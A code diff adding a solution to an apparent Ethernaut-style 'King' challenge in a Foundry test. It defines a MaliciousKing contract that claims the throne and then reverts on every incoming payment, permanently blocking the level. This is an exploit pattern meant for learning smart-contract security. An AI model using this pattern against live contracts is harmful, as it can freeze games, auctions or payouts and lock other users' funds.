@@ -39,7 +39,25 @@ contract TestKing is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
+        MaliciousKing maliciousKing = new MaliciousKing{value: level.prize()}(levelAddress);
+        maliciousKing.becomeKing();
 
         vm.stopPrank();
+    }
+}
+
+contract MaliciousKing {
+    King private level;
+
+    constructor(address _target) public payable {
+        level = King(payable(_target));
+    }
+
+    function becomeKing() public {
+        address(level).call{value: level.prize()}("");
+    }
+
+    receive() external payable {
+        revert("Now the game is over");
     }
 }
